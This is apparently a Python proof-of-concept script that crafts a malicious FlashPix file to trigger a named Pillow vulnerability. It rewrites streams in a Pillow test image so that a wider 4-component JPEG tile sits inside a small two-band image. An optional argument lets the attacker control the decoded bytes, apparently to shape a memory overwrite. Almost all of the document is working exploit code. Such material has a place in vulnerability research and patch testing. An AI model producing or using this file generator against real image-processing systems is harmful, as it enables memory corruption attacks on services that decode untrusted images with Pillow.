"""Craft a minimal real OLE2/FlashPix file for CVE-2026-112398.

Base container: Pillow 12.2.0 Tests/images/input_bw_five_bands.fpx.
Only three in-place, equal-size stream replacements are made with olefile:
  * Image Contents property set -> 16x16 image, 2 bands, colors LA
  * Resolution 0000/Subimage 0000 Header -> one 16x16 tile, compression 2,
    internal_color_conversion=1 (jpegmode=None => JCS_UNKNOWN path)
  * Resolution 0000/Subimage 0000 Data -> 4-component 256x16 JPEG at off 56
"""
import io
import os
import struct
import sys

import olefile
from PIL import Image

BASE = "/tmp/pw2-w1/pillow-12.2.0/Tests/images/input_bw_five_bands.fpx"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/pw2-w1/case.fpx"
JW = int(sys.argv[2]) if len(sys.argv) > 2 else 256
FILL = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x5A
IW = int(sys.argv[4]) if len(sys.argv) > 4 else 16
IH = int(sys.argv[5]) if len(sys.argv) > 5 else 16
# Optional 6th argument: 512 hex chars = 256 desired raw scanline bytes.
# When set, the embedded JPEG carries that pattern byte-for-byte in its
# first 256 raw decoded bytes (or a full 1024-byte row when a >=1024-byte
# pattern is given; libjpeg emits 0xff - encoded sample here).
PAT = bytes.fromhex(sys.argv[6]) if len(sys.argv) > 6 else None
PAT_FULL = PAT is not None and len(PAT) >= 1024
JPH = int(sys.argv[7]) if len(sys.argv) > 7 else 8

PROP = ["Data Object Store 000001", "\x05Image Contents"]
HDR = ["Data Object Store 000001", "Resolution 0000", "Subimage 0000 Header"]
DATA = ["Data Object Store 000001", "Resolution 0000", "Subimage 0000 Data"]


def u32(x):
    return struct.pack("<I", x)


def build_propset(w, h):
    """Minimal property set stream: width, height, 2-band LA blob."""
    o = olefile.OleFileIO(BASE)
    orig = o.openstream(PROP).read()
    o.close()
    # Reuse the 48-byte property-set header verbatim (byte order, fmtids).
    out = bytearray(orig[:48])
    entries = [(0x1000002, 32), (0x1000003, 40), (0x2000002, 48)]
    out += u32(72) + u32(len(entries))  # property set size, count
    for pid, off in entries:
        out += u32(pid) + u32(off)
    assert len(out) == 48 + 8 + 24
    out += struct.pack("<HH", 0x13, 0) + u32(w)      # VT_I4 width
    out += struct.pack("<HH", 0x13, 0) + u32(h)      # VT_I4 height
    blob = u32(1) + u32(2) + u32(0x00018000) + u32(0x00017FFE)
    out += struct.pack("<HH", 0x41, 0) + u32(len(blob)) + blob  # VT_BLOB
    assert len(out) == 48 + 72, len(out)
    return bytes(out) + b"\x00" * (len(orig) - len(out))


def build_header(w, h):
    o = olefile.OleFileIO(BASE)
    orig = o.openstream(HDR).read()
    o.close()
    out = bytearray(orig[:28])                  # opaque 28-byte property header
    out += u32(36) + u32(w) + u32(h) + u32(1)   # size, x, y, tilecount
    out += u32(w) + u32(h) + u32(2)             # xtile, ytile, channels
    out += u32(36) + u32(16)                    # tile desc offset, length
    out += u32(28) + u32(4096) + u32(2)         # data off, ?, compression=2
    out += b"\x00\x00\x01\x00"                  # td[12:14]=0, icc=1, jt=0
    assert len(out) == 80, len(out)
    return bytes(out)


def make_jpeg(w, h):
    if PAT is None:
        im = Image.new("CMYK", (w, h), (FILL, FILL, FILL, FILL))
    else:
        assert len(PAT) == 256 or len(PAT) >= w * 4, len(PAT)
        raw = PAT[:w * 4] if PAT_FULL else (PAT * ((w * 4) // 256 + 1))[:w * 4]
        inp = bytes(0xFF - v for v in raw)
        pix = b"".join(inp[4 * x:4 * x + 4] for x in range(w)) * JPH
        im = Image.frombytes("CMYK", (w, JPH), pix)
    b = io.BytesIO()
    im.save(b, format="JPEG", quality=100, subsampling=0,
            optimize=(PAT is not None))
    return b.getvalue()


def build_data(jpg):
    o = olefile.OleFileIO(BASE)
    orig = o.openstream(DATA).read()
    o.close()
    out = bytearray(orig[:56])       # opaque prefix; tile starts at 28+28
    out += jpg
    assert len(out) <= len(orig), (len(out), len(orig))
    return bytes(out) + b"\x00" * (len(orig) - len(out))


print("propset", len(build_propset(IW, IH)), "header", len(build_header(IW, IH)))
jpg = make_jpeg(JW, JPH if PAT is not None else IH)
print("jpeg", len(jpg), "fill", hex(FILL))
o = olefile.OleFileIO(BASE)
p = o.openstream(PROP).read()
d = o.openstream(DATA).read()
import shutil
shutil.copyfile(BASE, OUT)
with olefile.OleFileIO(OUT, write_mode=True) as w:
    w.write_stream(PROP, build_propset(IW, IH))
    w.write_stream(HDR, build_header(IW, IH))
    w.write_stream(DATA, build_data(jpg))
o = olefile.OleFileIO(OUT)
try:
    pp = o.getproperties(PROP)
    print("props:", {hex(k): pp[k] for k in (0x1000002, 0x1000003, 0x2000002)})
finally:
    o.close()
print("wrote", OUT, os.path.getsize(OUT))
